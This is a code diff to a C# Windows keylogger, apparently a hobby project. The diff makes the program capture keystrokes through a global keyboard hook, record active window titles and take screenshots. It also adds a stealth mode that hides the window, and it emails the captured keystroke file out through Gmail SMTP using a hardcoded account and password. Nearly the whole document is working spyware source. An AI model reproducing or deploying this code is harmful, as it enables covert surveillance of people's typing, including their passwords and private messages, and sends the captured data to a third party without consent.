@@ -7,7 +7,6 @@ using System.Runtime.InteropServices;
 using System.Windows.Interop;
 using System.Windows.Threading;
 using System.Linq;
-using System.Net;
 using System.Net.Mail;
 using System.Net.NetworkInformation;
 using System.Text;
@@ -39,12 +38,18 @@ namespace Keylogger
         
 
         #endregion
-
+        
         DispatcherTimer timerScreen = new DispatcherTimer();
         DispatcherTimer timerMail = new DispatcherTimer();
+
+        globalKeyboardHook gkh = new globalKeyboardHook();
+        private readonly Mutex m = new Mutex();
+        private bool isFree = true;
+
         string datatime = String.Empty;
+        static string winTitle = String.Empty;
+        private int nextline = 0;
         
-      
         #region Language
 
         private CultureInfo _currentLanaguge;
@@ -76,13 +81,13 @@ namespace Keylogger
 
             timerScreen.Tick += new EventHandler(timerScreen_tick);
             timerScreen.Interval = new TimeSpan(0,0,1);
-            timerScreen.Start();
+            
 
             txtNumMail.Text = _numValueScreen.ToString();
 
             timerMail.Tick += new EventHandler(timerMail_tick);
             timerMail.Interval = new TimeSpan(0, 0, 1);
-            timerMail.Start();
+            
 
             Task.Factory.StartNew(() =>
             {
@@ -100,24 +105,29 @@ namespace Keylogger
 
         private void MouseEvent(object sender, EventArgs e)
         {
-            if (IsWindowChanged())
+            new Thread(() =>
             {
-                if (IsMailSend())
+                if (IsWindowChanged())
                 {
+                    m.WaitOne();
+                    try
+                    {
+                        StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+                        datatime = DateTime.Now.ToString();
+                        SW.WriteLine();
+                        SW.WriteLine(datatime + "\t" + winTitle);
+                        SW.Close();
+                    }
+                    catch { }
+                    finally
+                    {
+                        m.ReleaseMutex();
+                    }
+
                 }
-                else
-                {
-                    StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
-                    datatime = DateTime.Now.ToString();
-                    SW.WriteLine();
-                    SW.WriteLine(datatime + "\t" + winTitle);
-                    SW.Close();
-                }
-            }
+            }).Start();
 
         }
-
-        static string winTitle = String.Empty;
 
         #region WINDOW_Activity
 
@@ -144,9 +154,6 @@ namespace Keylogger
         #endregion
 
         #region KEY_WRITE
-
-        globalKeyboardHook gkh = new globalKeyboardHook();
-        private int nextline = 0;
 
         #region Alphabet
 
@@ -218,142 +225,143 @@ namespace Keylogger
         private void KeysLoad()
         {
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
-            //if (File.Exists(AutoRun.Path() + "Key.txt"))
-            //{
-            //    //File.Delete(AutoRun.Path() + "Key.txt"); тест 7fack off bitch
-            //}
         }
+
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
-            bool nonNumberEntered = false;
-
-            if (IsMailSend())
+            new Thread(() =>
             {
-            }
-            else
-            {
-                using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
+                m.WaitOne();
+                bool nonNumberEntered = false;
+                
+                try
                 {
-
-                    if (IsWindowChanged())
+                    using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
                     {
-                        datatime = DateTime.Now.ToString();
-                        SW.WriteLine();
-                        SW.WriteLine();
-                        SW.WriteLine(datatime + "\t" + winTitle);
-                        SW.WriteLine();
 
-                    }
-                    if (nextline >= 70)
-                    {
-                        SW.WriteLine();
-                        nextline = 0;
-                    }
+                        if (IsWindowChanged())
+                        {
+                            datatime = DateTime.Now.ToString();
+                            SW.WriteLine();
+                            SW.WriteLine();
+                            SW.WriteLine(datatime + "\t" + winTitle);
+                            SW.WriteLine();
 
-                    #region KEYS
-
-                    if (!keys.Contains(e.KeyCode))
-                    {
-                        if (e.KeyCode == System.Windows.Forms.Keys.Space)
-                            SW.Write(" ");
-                        if (e.KeyCode == System.Windows.Forms.Keys.Return)
+                        }
+                        if (nextline >= 70)
                         {
                             SW.WriteLine();
-                            nextline = -1;
+                            nextline = 0;
                         }
-                        if (e.KeyCode == System.Windows.Forms.Keys.Multiply)
-                            SW.Write("*");
-                        if (e.KeyCode == System.Windows.Forms.Keys.Divide)
-                            SW.Write("/");
-                        if (e.KeyCode == System.Windows.Forms.Keys.OemMinus)
-                            SW.Write("-");
-                        if (e.KeyCode == System.Windows.Forms.Keys.Oemplus)
-                            SW.Write("+");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad0)
-                            SW.Write("0");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad1)
-                            SW.Write("1");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad2)
-                            SW.Write("2");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad3)
-                            SW.Write("3");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad4)
-                            SW.Write("4");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad5)
-                            SW.Write("5");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad6)
-                            SW.Write("6");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad7)
-                            SW.Write("7");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad8)
-                            SW.Write("8");
-                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad9)
-                            SW.Write("9");
-                        if (e.KeyCode == System.Windows.Forms.Keys.Add)
-                            SW.Write("+");
-                        if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
-                            SW.Write("-");
-                        if (e.KeyCode == System.Windows.Forms.Keys.D1)
-                            SW.Write("-");
+
+                        #region KEYS
+
+                        if (!keys.Contains(e.KeyCode))
+                        {
+                            if (e.KeyCode == System.Windows.Forms.Keys.Space)
+                                SW.Write(" ");
+                            if (e.KeyCode == System.Windows.Forms.Keys.Return)
+                            {
+                                SW.WriteLine();
+                                nextline = -1;
+                            }
+                            if (e.KeyCode == System.Windows.Forms.Keys.Multiply)
+                                SW.Write("*");
+                            if (e.KeyCode == System.Windows.Forms.Keys.Divide)
+                                SW.Write("/");
+                            if (e.KeyCode == System.Windows.Forms.Keys.OemMinus)
+                                SW.Write("-");
+                            if (e.KeyCode == System.Windows.Forms.Keys.Oemplus)
+                                SW.Write("+");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad0)
+                                SW.Write("0");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad1)
+                                SW.Write("1");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad2)
+                                SW.Write("2");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad3)
+                                SW.Write("3");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad4)
+                                SW.Write("4");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad5)
+                                SW.Write("5");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad6)
+                                SW.Write("6");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad7)
+                                SW.Write("7");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad8)
+                                SW.Write("8");
+                            if (e.KeyCode == System.Windows.Forms.Keys.NumPad9)
+                                SW.Write("9");
+                            if (e.KeyCode == System.Windows.Forms.Keys.Add)
+                                SW.Write("+");
+                            if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
+                                SW.Write("-");
+                            else
+                            {
+                                SW.Write("");
+                                nextline--;
+                            }
+                            nextline++;
+
+                        }
+                        #endregion
+
                         else
                         {
-                            SW.Write("");
-                            nextline--;
+                            switch (_currentLanaguge.Name)
+                            {
+                                case "en-US":
+                                    try
+                                    {
+                                        SW.Write(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
+                                        nextline++;
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        MessageBox.Show(ex.ToString());
+                                    }
+                                    break;
+                                case "ru-RU":
+                                    try
+                                    {
+                                        string rus = RKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
+                                        SW.Write(rus, true);
+                                        nextline++;
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        MessageBox.Show(ex.ToString());
+                                    }
+                                    break;
+                                case "uk-UA":
+                                    try
+                                    {
+                                        string ukr = UKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
+                                        SW.Write(ukr, true);
+                                        nextline++;
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        MessageBox.Show(ex.ToString());
+                                    }
+                                    break;
+
+                                default:
+                                    SW.Write(e.KeyCode);
+                                    break;
+                            }
                         }
-                        nextline++;
-
-
+                        SW.Close();
                     }
-                    #endregion
-
-                    else
-                    {
-                        switch (_currentLanaguge.Name)
-                        {
-                            case "en-US":
-                                try
-                                {
-                                    SW.Write(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
-                                    nextline++;
-                                }
-                                catch (Exception ex)
-                                {
-                                    MessageBox.Show(ex.ToString());
-                                }
-                                break;
-                            case "ru-RU":
-                                try
-                                {
-                                    string rus = RKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
-                                    SW.Write(rus, true);
-                                    nextline++;
-                                }
-                                catch (Exception ex)
-                                {
-                                    MessageBox.Show(ex.ToString());
-                                }
-                                break;
-                            case "uk-UA":
-                                try
-                                {
-                                    string ukr = UKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
-                                    SW.Write(ukr, true);
-                                    nextline++;
-                                }
-                                catch (Exception ex)
-                                {
-                                    MessageBox.Show(ex.ToString());
-                                }
-                                break;
-
-                            default:
-                                SW.Write(e.KeyCode);
-                                break;
-                        }
-                    }
-                    SW.Close();
                 }
-            }
+                finally
+                {
+                    m.ReleaseMutex();
+                }
+            }).Start();
+            
+            
         }
 
         #endregion
@@ -424,7 +432,8 @@ namespace Keylogger
                 if (_numValueScreen * 60 == timeScreen)
                 {
                     timeScreen = 0;
-                    string str = DateTime.Now.ToString().Replace(':', '_');
+                    string str = "1";
+                    //string str = DateTime.Now.ToString().Replace(':', '_');
                     ScreenShot.ScreenSave(str);
 
                 }
@@ -475,8 +484,9 @@ namespace Keylogger
 
         #endregion
 
-        #region MailTimer
+        #region e-Mail
         static bool sendbool = false;
+
         private static bool IsMailSend()
         {
             if (sendbool == true) return true;
@@ -488,20 +498,14 @@ namespace Keylogger
             IPStatus status = IPStatus.TimedOut;
             try
             {
-
                 Ping ping = new Ping();
-                PingReply reply = ping.Send(@"vk.com");
+                PingReply reply = ping.Send(@"google.com");
                 status = reply.Status;
             }
             catch { }
-            if (status != IPStatus.Success)
+            if (status == IPStatus.Success)
             {
-                
-            }
-            else
-            {
-                SendMail();
-                ClearFile();
+                   SendMail();
             }
 
         }
@@ -518,28 +522,34 @@ namespace Keylogger
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
             mail.From = new MailAddress("keyloggernazzim@gmail.com");
-            if (txtBoxMail.Text != String.Empty)
-            {
-                if(txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
-                    mail.To.Add(txtBoxMail.Text);
-            }
-            else
-            {
-                mail.To.Add("rusanovski@outlook.com");
-            }
+
+            txtBoxMail.Dispatcher.Invoke(new Action(() =>
+                {
+                    if (!string.IsNullOrEmpty(txtBoxMail.Text))
+                    {
+                        //if (txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
+                            mail.To.Add(txtBoxMail.Text);
+                        
+                    }
+                    else
+                    {
+                        mail.To.Add("rusanovski@outlook.com");
+                    }
+                }
+            ));
+            
             mail.Subject = "Keylogger Mail ";
             mail.Body = "Keys";
             try
             {
 
                 Attachment attachment;
-                attachment = new Attachment(AutoRun.Path() + "yoda2.jpg");
+                attachment = new Attachment(AutoRun.Path() + "Key.txt");
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
                 SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
                 SmtpServer.EnableSsl = true;
-
                 SmtpServer.Send(mail);
             }
             catch (Exception ex)
@@ -552,6 +562,7 @@ namespace Keylogger
         private int timeMail = 0;
         private void timerMail_tick(object sender, EventArgs e)
         {
+            
             timeMail++;
             labeltimemail.Content = timeMail.ToString();
 
@@ -559,11 +570,19 @@ namespace Keylogger
             {
                 if (_numValueMail * 2 == timeMail)
                 {
-                    sendbool = true;
-                    InternetConnect();
-                    timeMail = 0;
-                    sendbool = false;
-
+                    new Thread(() =>
+                    {
+                        m.WaitOne();
+                        try
+                        {
+                            InternetConnect();
+                        }
+                        finally
+                        {
+                            m.ReleaseMutex();//error
+                            timeMail = 0;
+                        }
+                    }).Start();
                 }
             }
             else
@@ -644,6 +663,8 @@ namespace Keylogger
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
             KeysLoad();
+            timerScreen.Start();
+            timerMail.Start();
         }
 
         private void Stealth_Unchecked(object sender, RoutedEventArgs e)
